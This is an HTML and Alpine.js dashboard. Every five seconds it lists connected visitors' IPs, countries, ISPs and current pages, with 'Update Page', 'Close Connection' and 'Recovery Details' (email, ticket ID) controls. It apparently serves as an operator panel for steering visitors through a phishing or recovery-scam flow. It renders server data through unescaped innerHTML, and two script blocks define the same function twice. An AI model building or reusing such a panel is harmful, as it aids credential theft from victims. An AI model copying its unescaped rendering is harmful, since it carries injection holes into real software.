<!DOCTYPE html>
<html lang="en" class="h-full bg-gray-100">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Professional Dashboard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
</head>
<body class="h-full font-sans antialiased">

  <div class="flex h-screen">
    <!-- Sidebar -->
    <aside class="w-20 bg-white shadow-md flex flex-col items-center py-6">
      <div class="mb-10">
        <img src="https://via.placeholder.com/40x40?text=P" alt="Logo" class="rounded-full" />
      </div>
      <nav class="flex flex-col space-y-6">
        <a href="#" title="Main Dashboard" class="text-black hover:text-gray-600">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M3 6h18M3 14h18M3 18h18"/>
          </svg>
        </a>
      </nav>
    </aside>

    <!-- Main content -->
    <main class="flex-1 p-8 overflow-y-auto" x-data="{ showCard: false, cardContent: '' }">
      <div class="border-b border-gray-300 mb-6 pb-4">
        <h1 class="text-2xl font-semibold text-gray-800">Main Dashboard</h1>
      </div>

      <!-- Modern Table -->
      <div class="bg-white shadow-sm rounded-lg overflow-hidden">
        <table class="min-w-full text-sm text-left text-gray-700">
          <thead class="bg-gray-100 uppercase text-xs font-semibold text-gray-500">
            <tr>
              <th scope="col" class="px-6 py-3">IP</th>
              <th scope="col" class="px-6 py-3">Country</th>
              <th scope="col" class="px-6 py-3">ISP</th>
              <th scope="col" class="px-6 py-3">Active Page</th>
              <th scope="col" class="px-6 py-3">Actions</th>
            </tr>
          </thead>
          <tbody class="divide-y divide-gray-200">

            <!-- Example Row -->
            <tr class="hover:bg-gray-50">
              <td class="px-6 py-4">192.168.0.1</td>
              <td class="px-6 py-4">United States</td>
              <td class="px-6 py-4">Comcast</td>
              <td class="px-6 py-4">/thepage</td>
              <td class="px-6 py-4 flex space-x-3">
                <!-- Update Page -->
                <button title="Update Page" class="text-gray-600 hover:text-black">
                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582M20 20v-5h-.582M4 4h5M20 20h-5M4 4l16 16" />
                  </svg>
                </button>

                <!-- Eye (Eyeball) -->
                <button 
                  title="View Details" 
                  class="text-gray-600 hover:text-black" 
                  @click="cardContent = 'Details for IP: 192.168.0.1'; showCard = true">
                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7c-1.274 4.057-5.065 7-9.542 7s-8.268-2.943-9.542-7z" />
                  </svg>
                </button>

                <!-- Close Connection -->
                <button title="Close Connection" class="text-red-600 hover:text-red-800" @click="alert('Connection closed')">
                  <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </td>
            </tr>

            <!-- You can repeat the <tr> for more rows dynamically -->

          </tbody>
        </table>
      </div>

      <!-- Floating Card -->
      <div 
        x-show="showCard" 
        @click.outside="showCard = false" 
        class="fixed top-24 right-10 w-96 bg-white shadow-xl rounded-lg p-6 border border-gray-200"
        x-transition>
        <div class="flex justify-between items-center mb-4">
          <h2 class="text-lg font-semibold">Connection Details</h2>
          <button @click="showCard = false" class="text-gray-500 hover:text-black">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>
        <p class="text-sm text-gray-600" x-text="cardContent"></p>
      </div>
    </main>
  </div>

<!-- Recovery Modal -->
<div id="recoveryModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
  <div class="bg-white rounded-xl shadow-lg p-6 w-full max-w-md">
    <div class="text-lg font-semibold mb-4">📩 Recovery Details</div>
    <div class="space-y-2 text-sm">
      <p><strong>Email:</strong> <span id="modalEmail"></span></p>
      <p><strong>Ticket ID:</strong> <span id="modalTicket"></span></p>
      <p><strong>IP:</strong> <span id="modalIP"></span></p>
      <p><strong>Country:</strong> <span id="modalCountry"></span></p>
      <p><strong>ISP:</strong> <span id="modalISP"></span></p>
    </div>
    <button onclick="closeModal()" class="mt-6 w-full py-2 bg-red-600 text-white rounded-lg hover:bg-red-700">Close</button>
  </div>
</div>

<script>
  async function fetchConnections() {
    try {
      const response = await fetch('/connections');
      const data = await response.json();
      const tbody = document.querySelector('tbody');
      tbody.innerHTML = '';

      data.forEach(conn => {
        const row = document.createElement('tr');
        row.className = 'hover:bg-gray-50';
        row.innerHTML = `
          <td class="px-6 py-4">${conn.ip}</td>
          <td class="px-6 py-4">${conn.country}</td>
          <td class="px-6 py-4">${conn.isp}</td>
          <td class="px-6 py-4">${conn.page || ''}</td>
          <td class="px-6 py-4 flex space-x-3">
            <button title="View Recovery" onclick='showRecovery(${JSON.stringify(conn)})' class="text-gray-600 hover:text-black">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7c-1.274 4.057-5.065 7-9.542 7s-8.268-2.943-9.542-7z" />
              </svg>
            </button>
          </td>
        `;
        tbody.appendChild(row);
      });
    } catch (err) {
      console.error('Failed to load connections:', err);
    }
  }

  function showRecovery(conn) {
    document.getElementById("modalEmail").textContent = conn.email || "—";
    document.getElementById("modalTicket").textContent = conn.ticket || "—";
    document.getElementById("modalIP").textContent = conn.ip || "—";
    document.getElementById("modalCountry").textContent = conn.country || "—";
    document.getElementById("modalISP").textContent = conn.isp || "—";
    document.getElementById("recoveryModal").classList.remove('hidden');
  }

  function closeModal() {
    document.getElementById("recoveryModal").classList.add('hidden');
  }

  fetchConnections();
  setInterval(fetchConnections, 5000);
</script>


<script>
  async function fetchConnections() {
    try {
      const response = await fetch('/connections');
      const data = await response.json();
      const tbody = document.querySelector('tbody');

      // Clear existing rows
      tbody.innerHTML = '';

      data.forEach(conn => {
        const row = document.createElement('tr');
        row.className = 'hover:bg-gray-50';

        row.innerHTML = `
          <td class="px-6 py-4">${conn.ip}</td>
          <td class="px-6 py-4">${conn.country}</td>
          <td class="px-6 py-4">${conn.isp}</td>
          <td class="px-6 py-4">${conn.page}</td>
          <td class="px-6 py-4 flex space-x-3">
            <button title="Update Page" class="text-gray-600 hover:text-black">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582M20 20v-5h-.582M4 4h5M20 20h-5M4 4l16 16" />
              </svg>
            </button>
            <button 
              title="View Details" 
              class="text-gray-600 hover:text-black" 
              onclick="showDetails('Details for IP: ${conn.ip}')">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7c-1.274 4.057-5.065 7-9.542 7s-8.268-2.943-9.542-7z" />
              </svg>
            </button>
            <button title="Close Connection" class="text-red-600 hover:text-red-800" onclick="alert('Connection closed')">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </td>
        `;
        tbody.appendChild(row);
      });
    } catch (err) {
      console.error('Failed to load connections:', err);
    }
  }

  function showDetails(text) {
    const card = document.querySelector('[x-data]');
    card.__x.$data.cardContent = text;
    card.__x.$data.showCard = true;
  }

  // Load initially and every 5 seconds
  fetchConnections();
  setInterval(fetchConnections, 5000);
</script>

</body>
</html>
